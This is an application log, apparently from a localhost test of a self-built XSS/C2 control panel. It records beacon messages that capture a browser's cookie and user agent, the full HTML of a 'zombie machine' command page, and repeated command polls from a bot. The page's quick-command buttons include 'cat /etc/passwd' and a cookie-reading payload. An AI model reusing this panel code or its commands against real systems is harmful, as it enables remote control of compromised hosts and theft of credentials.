2025-06-26 21:24:47 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T13:24:47.378Z"},時間: 2025-06-26 21:24:47.384877
2025-06-26 21:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0053s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 21:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:47] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 21:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:24:47 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:24:47.378Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:24:47.380560</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:47] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 21:24:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:24:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:24:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:24:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:24:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:24:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:24:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:24:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:24:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:25:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:25:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:25:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:25:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:25:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:26:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:26:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:26:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:26:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:26:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0030s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0023s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:27:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:27:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0028s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:27:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:27:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:27:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
